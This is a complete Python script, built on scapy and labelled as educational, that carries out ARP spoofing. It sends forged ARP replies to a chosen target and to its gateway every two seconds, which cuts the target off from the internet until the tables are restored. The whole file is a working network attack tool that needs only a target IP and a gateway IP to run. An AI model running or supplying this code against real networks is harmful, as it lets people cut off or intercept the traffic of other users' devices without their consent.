import sys
import time
from scapy.all import ARP, send, getmacbyip
import threading
import os

# ARP Spoofing Script for Educational/Demonstration Purposes
# This script convinces the target device that we are the router, 
# and convinces the router that we are the target device.
# By dropping the forwarded packets (or simply not forwarding them), 
# the target device loses internet connectivity, effectively blocking them.

def get_mac(ip):
    try:
        mac = getmacbyip(ip)
        if not mac:
            print(f"Could not find MAC for {ip}")
        return mac
    except Exception as e:
        print(f"Error getting MAC for {ip}: {e}")
        return None

def spoof(target_ip, spoof_ip, target_mac):
    # Construct an ARP response (op=2)
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)

def restore(destination_ip, source_ip):
    dest_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    if dest_mac and source_mac:
        # Construct an ARP response to restore the tables
        packet = ARP(op=2, pdst=destination_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
        send(packet, count=4, verbose=False)

def main():
    if len(sys.argv) < 3:
        print("Usage: python real_blocker.py <target_ip> <gateway_ip>")
        sys.exit(1)

    target_ip = sys.argv[1]
    gateway_ip = sys.argv[2]

    # For a real presentation on Wi-Fi, getting the MAC is crucial.
    print(f"Starting ARP block on {target_ip} from gateway {gateway_ip}...")
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)

    if not target_mac or not gateway_mac:
        print("Could not resolve MAC addresses. Ensure device is active on network.")
        sys.exit(1)

    print(f"Target MAC: {target_mac}")
    print(f"Gateway MAC: {gateway_mac}")

    try:
        while True:
            # Tell target we are the gateway
            spoof(target_ip, gateway_ip, target_mac)
            # Tell gateway we are the target
            spoof(gateway_ip, target_ip, gateway_mac)
            time.sleep(2) # Send packets every 2 seconds
    except KeyboardInterrupt:
        print("Restoring ARP tables...")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
        print("Restored. Exiting.")

if __name__ == "__main__":
    main()
